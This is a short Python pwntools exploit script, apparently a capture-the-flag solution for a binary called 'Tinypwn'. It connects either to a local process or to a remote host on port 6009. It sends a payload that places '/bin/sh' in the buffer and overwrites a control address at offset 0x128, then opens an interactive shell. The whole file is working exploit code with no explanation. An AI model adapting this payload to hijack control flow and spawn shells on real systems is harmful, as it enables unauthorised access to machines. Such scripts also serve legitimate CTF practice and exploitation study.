#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./Tinypwn"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("159.65.125.233",6009)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

f={
    0:"/bin/sh\x00",
    0x128:0x4000ed,
}
conn.send(fit(f,length=0x142,filler="\x00"))
conn.interactive()
